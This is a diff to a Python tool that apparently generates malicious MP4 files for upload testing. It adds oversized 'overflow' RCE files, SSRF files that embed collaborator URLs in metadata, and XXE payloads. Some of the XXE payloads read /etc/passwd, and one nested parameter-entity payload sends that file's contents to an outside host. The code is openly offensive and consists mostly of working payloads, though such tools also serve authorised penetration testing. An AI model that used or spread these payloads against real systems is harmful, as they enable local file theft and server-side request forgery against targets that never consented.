@@ -46,6 +46,9 @@ def generate_mp4_payloads(output_dir, burp_collab, tech_filter='all', payload_ty
     if should_generate_type('ssrf'):
         ssrf_dir = output_dir / 'ssrf'
         ssrf_dir.mkdir(exist_ok=True)
+    if should_generate_type('xxe'):
+        xxe_dir = output_dir / 'xxe'
+        xxe_dir.mkdir(exist_ok=True)
     if should_generate_type('xss'):
         xss_dir = output_dir / 'xss'
         xss_dir.mkdir(exist_ok=True)
@@ -129,6 +132,14 @@ def generate_mp4_payloads(output_dir, burp_collab, tech_filter='all', payload_ty
     if should_generate_type('rce'):
         with open(rce_dir / "rce3_cve_2024_30194.mp4", 'wb') as f:
             f.write(mp4_rce3_cve_2024_30194)
+        
+        mp4_rce4_ffmpeg_overflow = create_atom(ftyp_atom, b'isom') + struct.pack('>I', 0xFFFFFFFF) + moov_atom + b'A' * 100000
+        with open(rce_dir / "rce4_ffmpeg_overflow.mp4", 'wb') as f:
+            f.write(mp4_rce4_ffmpeg_overflow)
+        
+        mp4_rce5_h264_overflow = create_atom(ftyp_atom, b'isom') + create_atom(moov_atom, create_atom(trak_atom, create_atom(stsd_atom, b'\xFF' * 65536)))
+        with open(rce_dir / "rce5_h264_overflow.mp4", 'wb') as f:
+            f.write(mp4_rce5_h264_overflow)
     
     mp4_dos1_invalid_atom = create_atom(ftyp_atom, b'isom') + b'\xFF' * 100
     if should_generate_type('dos'):
@@ -174,6 +185,65 @@ def generate_mp4_payloads(output_dir, burp_collab, tech_filter='all', payload_ty
     if should_generate_type('ssrf'):
         with open(ssrf_dir / "ssrf2_xfce_tumbler.mp4", 'wb') as f:
             f.write(mp4_ssrf2_xfce_tumbler)
+        
+        mp4_ssrf3_https_metadata = create_atom(ftyp_atom, b'isom') + create_atom(moov_atom, f'<metadata><url>https://{burp_collab}/ssrf-https</url></metadata>'.encode('utf-8') + b'\x00' * 1000)
+        with open(ssrf_dir / "ssrf3_https_metadata.mp4", 'wb') as f:
+            f.write(mp4_ssrf3_https_metadata)
+        
+        mp4_ssrf4_cover_art = create_atom(ftyp_atom, b'isom') + create_atom(moov_atom, f'<metadata><cover>{base_url}/ssrf-cover</cover></metadata>'.encode('utf-8') + b'\x00' * 1000)
+        with open(ssrf_dir / "ssrf4_cover_art.mp4", 'wb') as f:
+            f.write(mp4_ssrf4_cover_art)
+        
+        mp4_ssrf5_thumbnail_url = create_atom(ftyp_atom, b'isom') + create_atom(moov_atom, f'<thumbnail src="{base_url}/ssrf-thumbnail"></thumbnail>'.encode('utf-8') + b'\x00' * 1000)
+        with open(ssrf_dir / "ssrf5_thumbnail_url.mp4", 'wb') as f:
+            f.write(mp4_ssrf5_thumbnail_url)
+    
+    if should_generate_type('xxe'):
+        mp4_xxe1_metadata_doctype = create_atom(ftyp_atom, b'isom') + create_atom(moov_atom, f'''<?xml version="1.0"?>
+<!DOCTYPE metadata [
+<!ENTITY xxe SYSTEM "{base_url}/xxe-mp4-1">
+]>
+<metadata>&xxe;</metadata>'''.encode('utf-8') + b'\x00' * 1000)
+        with open(xxe_dir / "xxe1_metadata_doctype.mp4", 'wb') as f:
+            f.write(mp4_xxe1_metadata_doctype)
+        
+        mp4_xxe2_file = create_atom(ftyp_atom, b'isom') + create_atom(moov_atom, f'''<?xml version="1.0"?>
+<!DOCTYPE metadata [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<metadata>&xxe;</metadata>'''.encode('utf-8') + b'\x00' * 1000)
+        with open(xxe_dir / "xxe2_file.mp4", 'wb') as f:
+            f.write(mp4_xxe2_file)
+        
+        mp4_xxe3_parameter = create_atom(ftyp_atom, b'isom') + create_atom(moov_atom, f'''<?xml version="1.0"?>
+<!DOCTYPE metadata [
+<!ENTITY % xxe SYSTEM "{base_url}/xxe-mp4-param">
+%xxe;
+]>
+<metadata>test</metadata>'''.encode('utf-8') + b'\x00' * 1000)
+        with open(xxe_dir / "xxe3_parameter.mp4", 'wb') as f:
+            f.write(mp4_xxe3_parameter)
+        
+        mp4_xxe4_nested = create_atom(ftyp_atom, b'isom') + create_atom(moov_atom, f'''<?xml version="1.0"?>
+<!DOCTYPE metadata [
+<!ENTITY % remote SYSTEM "{base_url}/xxe-mp4-nested">
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{base_url}/xxe-mp4-exfil?data=%file;'>">
+%remote;
+%eval;
+%exfil;
+]>
+<metadata>test</metadata>'''.encode('utf-8') + b'\x00' * 1000)
+        with open(xxe_dir / "xxe4_nested.mp4", 'wb') as f:
+            f.write(mp4_xxe4_nested)
+        
+        mp4_xxe5_php_wrapper = create_atom(ftyp_atom, b'isom') + create_atom(moov_atom, f'''<?xml version="1.0"?>
+<!DOCTYPE metadata [
+<!ENTITY xxe SYSTEM "php://filter/read=string.rot13/resource={base_url}/xxe-mp4-php">
+]>
+<metadata>&xxe;</metadata>'''.encode('utf-8') + b'\x00' * 1000)
+        with open(xxe_dir / "xxe5_php_wrapper.mp4", 'wb') as f:
+            f.write(mp4_xxe5_php_wrapper)
     
     mp4_xss1_video_embed = create_atom(ftyp_atom, b'isom') + create_atom(moov_atom, b'<script>alert(1)</script>' + b'\x00' * 1000)
     if should_generate_type('xss'):
